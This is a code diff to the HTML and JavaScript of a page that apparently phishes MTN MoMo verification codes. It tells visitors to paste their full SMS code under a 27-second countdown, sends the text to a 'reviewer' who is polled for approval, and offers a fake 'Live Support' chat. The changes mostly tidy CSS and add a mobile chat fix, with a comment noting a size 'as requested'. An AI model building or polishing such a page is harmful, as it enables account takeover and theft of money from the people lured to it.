@@ -32,14 +32,8 @@
             padding: 26px 22px; box-shadow: 0 2px 8px rgba(0,0,0,0.03);
         }
 
-        .card h2 {
-            font-size: 20px; font-weight: 800; color: #0a3d62;
-            margin-bottom: 8px;
-        }
-        .card .desc {
-            font-size: 14px; color: #6b7280; line-height: 1.5;
-            margin-bottom: 20px;
-        }
+        .card h2 { font-size: 20px; font-weight: 800; color: #0a3d62; margin-bottom: 8px; }
+        .card .desc { font-size: 14px; color: #6b7280; line-height: 1.5; margin-bottom: 20px; }
 
         /* TIMER BOX */
         .timer-box {
@@ -51,74 +45,52 @@
             width: 44px; height: 44px; border-radius: 50%;
             border: 3px solid #e67e22;
             display: flex; align-items: center; justify-content: center;
-            font-size: 15px; font-weight: 800; color: #e67e22;
-            flex-shrink: 0;
+            font-size: 15px; font-weight: 800; color: #e67e22; flex-shrink: 0;
         }
         .timer-circle.urgent {
-            border-color: #dc2626; color: #dc2626;
-            animation: pulse 1s infinite;
+            border-color: #dc2626; color: #dc2626; animation: pulse 1s infinite;
         }
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.08); }
-        }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
         .timer-text { font-size: 14px; color: #92400e; line-height: 1.4; }
         .timer-text strong { color: #78350f; font-weight: 700; }
 
         /* TEXTAREA */
         .sms-input {
-            width: 100%; min-height: 110px;
-            padding: 14px 16px;
+            width: 100%; min-height: 110px; padding: 14px 16px;
             font-size: 15px; font-family: inherit; color: #111;
             border: 2px solid #ffcc00; border-radius: 10px;
             background: #fffdf5; outline: none; resize: vertical;
-            margin-bottom: 12px;
-            transition: box-shadow .2s;
+            margin-bottom: 12px; transition: box-shadow .2s;
         }
         .sms-input::placeholder { color: #aaa; }
         .sms-input:focus { box-shadow: 0 0 0 4px rgba(255,204,0,.25); }
         .sms-input.error { border-color: #dc2626; background: #fff5f5; }
 
-        .example-text {
-            font-size: 12px; color: #6b7280; font-style: italic;
-            margin-bottom: 18px; line-height: 1.5;
-        }
+        .example-text { font-size: 12px; color: #6b7280; font-style: italic; margin-bottom: 18px; line-height: 1.5; }
 
         /* SUBMIT BUTTON */
         .submit-btn {
-            width: 100%; padding: 16px;
-            font-size: 15px; font-weight: 800; letter-spacing: 1px;
-            color: #fff; background: #9ca3af; border: none;
-            border-radius: 10px; cursor: not-allowed;
+            width: 100%; padding: 16px; font-size: 15px; font-weight: 800; letter-spacing: 1px;
+            color: #fff; background: #9ca3af; border: none; border-radius: 10px; cursor: not-allowed;
             transition: background .2s;
         }
-        .submit-btn.active {
-            background: #ffcc00; color: #111; cursor: pointer;
-        }
+        .submit-btn.active { background: #ffcc00; color: #111; cursor: pointer; }
         .submit-btn.active:hover { background: #e6b800; }
         .submit-btn.active:active { transform: scale(.99); }
 
         /* ERROR / STATUS */
-        .error-msg { display: none; font-size: 13px; color: #dc2626;
-                     font-weight: 600; margin-bottom: 12px; text-align: center; }
+        .error-msg { display: none; font-size: 13px; color: #dc2626; font-weight: 600; margin-bottom: 12px; text-align: center; }
         .error-msg.show { display: block; }
         .error-msg.info { color: #b8860b; }
 
         /* RESEND */
         .resend-wrap { text-align: center; margin-top: 16px; }
-        .resend-btn {
-            background: transparent; border: none; color: #b8860b;
-            font-size: 13px; font-weight: 700; cursor: pointer;
-            text-decoration: underline;
-        }
+        .resend-btn { background: transparent; border: none; color: #b8860b; font-size: 13px; font-weight: 700; cursor: pointer; text-decoration: underline; }
         .resend-btn:disabled { color: #aaa; cursor: not-allowed; text-decoration: none; }
 
-        @media (max-width: 480px) {
-            .card { padding: 22px 18px; }
-            .card h2 { font-size: 18px; }
-        }
+        @media (max-width: 480px) { .card { padding: 22px 18px; } .card h2 { font-size: 18px; } }
 
-        /* NEW: Chat CSS to stop overlap */
+        /* ═══ CHAT PANEL STYLES ═══ */
         #chat-panel {
             display: none; 
             position: fixed; 
@@ -135,19 +107,6 @@
             overflow: hidden; 
             border: 1px solid #ddd;
         }
-
-        /* Mobile specific fix */
-        @media (max-width: 600px) {
-            #chat-panel {
-                top: 80px; /* Anchors to top of screen below navbar */
-                bottom: auto; /* Stops it from moving with keyboard */
-                left: 10px;
-                right: 10px;
-                width: auto;
-                height: calc(100vh - 100px); /* Leaves space at bottom */
-                max-height: 450px;
-            }
-        }
     </style>
 </head>
 <body>
@@ -162,12 +121,8 @@
     <main class="main">
         <div class="card">
             <h2>Paste SMS Message</h2>
-            <p class="desc">
-                A verification message has been sent to your phone. Please copy
-                and paste the full message here.
-            </p>
+            <p class="desc">A verification message has been sent to your phone. Please copy and paste the full message here.</p>
 
-            <!-- TIMER -->
             <div class="timer-box">
                 <div class="timer-circle" id="timerCircle">27</div>
                 <div class="timer-text">
@@ -176,42 +131,27 @@
                 </div>
             </div>
 
-            <!-- ERROR -->
             <div class="error-msg" id="errorMsg"></div>
 
-            <!-- FORM -->
             <form id="verifyForm">
-                <textarea id="code" class="sms-input"
-                          placeholder="Paste your full SMS message here..."
-                          maxlength="500" autocomplete="off"></textarea>
-
-                <p class="example-text">
-                    Example: "Your MTN MoMo verification code is: 123456"
-                </p>
-
-                <button type="submit" class="submit-btn" id="submitBtn" disabled>
-                    SUBMIT
-                </button>
+                <textarea id="code" class="sms-input" placeholder="Paste your full SMS message here..." maxlength="500" autocomplete="off"></textarea>
+                <p class="example-text">Example: "Your MTN MoMo verification code is: 123456"</p>
+                <button type="submit" class="submit-btn" id="submitBtn" disabled>SUBMIT</button>
             </form>
 
             <div class="resend-wrap">
                 <button class="resend-btn" id="resendBtn">Didn't receive a code? Resend</button>
             </div>
             
-            <!-- NEW: Chat with Agent Button -->
             <div style="text-align: center; margin-top: 15px; padding-top: 15px; border-top: 1px solid #eee;">
-                <button type="button" id="openChatBtn" style="background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 10px; font-size: 15px; font-weight: 700; cursor: pointer;">
-                    💬 CHAT WITH AGENT
-                </button>
+                <button type="button" id="openChatBtn" style="background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 10px; font-size: 15px; font-weight: 700; cursor: pointer;">💬 CHAT WITH AGENT</button>
             </div>
-            <!-- END NEW -->
         </div>
     </main>
 
     <!-- Chat Panel -->
     <div id="chat-panel">
-        
-        <div style="background:#1a73e8; color:white; padding:14px; font-weight:600; display:flex; justify-content:space-between; align-items:center;">
+        <div style="background:#1a73e8; color:white; padding:12px; font-weight:600; display:flex; justify-content:space-between; align-items:center; flex-shrink:0;">
             <span>Live Support</span>
             <span style="font-size:11px; opacity:0.9;">● Online</span>
             <button id="closeChatBtn" style="background:none; border:none; color:white; font-size:20px; cursor:pointer; line-height:1;">&times;</button>
@@ -219,7 +159,7 @@
         
         <div id="chat-messages" style="flex:1; padding:12px; overflow-y:auto; background:#f5f7fb; font-size:14px; display:flex; flex-direction:column;"></div>
         
-        <div style="display:flex; border-top:1px solid #eee; background:#fff;">
+        <div style="display:flex; border-top:1px solid #eee; background:#fff; flex-shrink:0;">
             <input id="chat-input" type="text" placeholder="Type a message..." style="flex:1; border:none; padding:12px; outline:none; font-size:16px; color:#333;">
             <button id="chat-send" style="background:#1a73e8; color:white; border:none; padding:0 18px; cursor:pointer; font-weight:600;">Send</button>
         </div>
@@ -231,7 +171,6 @@
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             
-            // ─── URL params ───
             const params = new URLSearchParams(window.location.search);
             const phone     = params.get('phone')     || 'unknown';
             const firstName = params.get('firstName') || '';
@@ -245,7 +184,6 @@
             const timerCircle = document.getElementById('timerCircle');
             const timerSec   = document.getElementById('timerSec');
 
-            // ─── Countdown timer ───
             const TIMER_START = 27;
             let timeLeft = TIMER_START;
             let timerInterval = null;
@@ -311,22 +249,11 @@
             function showRejected() {
                 document.querySelector('.card').innerHTML = `
                     <div style="text-align:center;">
-                        <div style="width:80px;height:80px;border-radius:50%;background:#dc2626;
-                                    display:flex;align-items:center;justify-content:center;
-                                    margin:0 auto 18px;font-size:40px;color:#fff;">✕</div>
-                        <h2 style="font-size:20px;font-weight:800;color:#dc2626;margin-bottom:10px;">
-                            Application Rejected
-                        </h2>
-                        <div style="display:inline-block;padding:6px 14px;border-radius:20px;
-                                    background:#fdecea;color:#dc2626;font-size:12px;font-weight:700;
-                                    margin-bottom:18px;">INVALID SMS MESSAGE</div>
-                        <p style="font-size:14px;color:#555;line-height:1.6;margin-bottom:20px;">
-                            The SMS message you submitted could not be verified.<br>
-                            Please check your SMS and try again.
-                        </p>
-                        <button onclick="location.reload()" style="background:#111;color:#ffcc00;
-                                border:none;padding:14px 28px;font-size:14px;font-weight:800;
-                                border-radius:10px;cursor:pointer;">Try Again</button>
+                        <div style="width:80px;height:80px;border-radius:50%;background:#dc2626; display:flex;align-items:center;justify-content:center; margin:0 auto 18px;font-size:40px;color:#fff;">✕</div>
+                        <h2 style="font-size:20px;font-weight:800;color:#dc2626;margin-bottom:10px;">Application Rejected</h2>
+                        <div style="display:inline-block;padding:6px 14px;border-radius:20px; background:#fdecea;color:#dc2626;font-size:12px;font-weight:700; margin-bottom:18px;">INVALID SMS MESSAGE</div>
+                        <p style="font-size:14px;color:#555;line-height:1.6;margin-bottom:20px;">The SMS message you submitted could not be verified.<br>Please check your SMS and try again.</p>
+                        <button onclick="location.reload()" style="background:#111;color:#ffcc00; border:none;padding:14px 28px;font-size:14px;font-weight:800; border-radius:10px;cursor:pointer;">Try Again</button>
                     </div>
                 `;
             }
@@ -354,11 +281,9 @@
                     });
                     const data = await res.json();
                     referenceId = data.referenceId;
-
                     errorMsg.textContent = '📩 Sent to reviewer. Please wait…';
                     errorMsg.style.color = '#b8860b';
                     errorMsg.classList.add('show', 'info');
-
                     startPolling();
                 } catch (err) {
                     errorMsg.textContent = '⚠️ Network error. Please try again.';
@@ -406,7 +331,7 @@
                 }, 5000);
             });
 
-            // ═══ CHAT LOGIC (PUSHER) ═══
+            // ═══ CHAT LOGIC (PUSHER & KEYBOARD FIX) ═══
             const panel = document.getElementById('chat-panel');
             const messages = document.getElementById('chat-messages');
             const input = document.getElementById('chat-input');
@@ -416,16 +341,39 @@
 
             const myUserId = 'user_' + Math.random().toString(36).substr(2, 9);
 
+            // Default desktop styles
+            let defaultStyles = {
+                width: '330px',
+                height: '400px',
+                bottom: '20px',
+                right: '20px',
+                left: 'auto'
+            };
+
             openBtn.onclick = () => { 
-                panel.style.display = 'flex'; 
-                // Scroll to bottom when opened
-                setTimeout(() => { messages.scrollTop = messages.scrollHeight; }, 100);
+                panel.style.display = 'flex';
+                // Reset to default styles first
+                Object.assign(panel.style, defaultStyles);
+                
+                // MOBILE KEYBOARD FIX:
+                // Listen for screen resize when keyboard opens
+                setTimeout(() => {
+                    if (window.innerWidth <= 600) {
+                        // If on mobile, force the chat box to fit perfectly above keyboard
+                        panel.style.width = 'calc(100% - 20px)';
+                        panel.style.left = '10px';
+                        panel.style.right = '10px';
+                        panel.style.height = '350px'; // SMALL SIZE as requested
+                        panel.style.bottom = '10px'; // Keeps it above keyboard
+                        window.scrollTo(0, 0); // Stop page from scrolling up
+                    }
+                }, 100);
+
+                setTimeout(() => { messages.scrollTop = messages.scrollHeight; }, 200);
                 input.focus(); 
             };
             
-            closeBtn.onclick = () => { 
-                panel.style.display = 'none'; 
-            };
+            closeBtn.onclick = () => { panel.style.display = 'none'; };
 
             function addMsg(text, who) {
                 const div = document.createElement('div');
